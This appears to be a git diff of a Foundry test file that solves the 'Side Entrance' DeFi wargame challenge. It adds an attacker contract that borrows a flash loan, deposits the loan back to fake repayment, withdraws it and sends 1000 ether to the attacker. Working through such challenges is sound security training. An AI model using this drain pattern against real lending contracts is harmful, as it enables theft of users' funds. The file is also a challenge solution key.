@@ -4,7 +4,32 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
-import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
+
+contract AttackerContract is IFlashLoanEtherReceiver {
+    using Address for address payable;
+
+    SideEntranceLenderPool public pool;
+    address owner;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        owner = msg.sender;
+    }
+
+    function execute() external payable {
+        pool.deposit{value: 1000 ether}();
+    }
+
+    function go() public payable {
+        pool.flashLoan(1000 ether);
+        pool.withdraw();
+        payable(owner).sendValue(1000 ether);
+    }
+
+    receive() external payable {}
+}
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -36,7 +61,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        AttackerContract attackerContract = new AttackerContract(address(sideEntranceLenderPool));
+        attackerContract.go();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
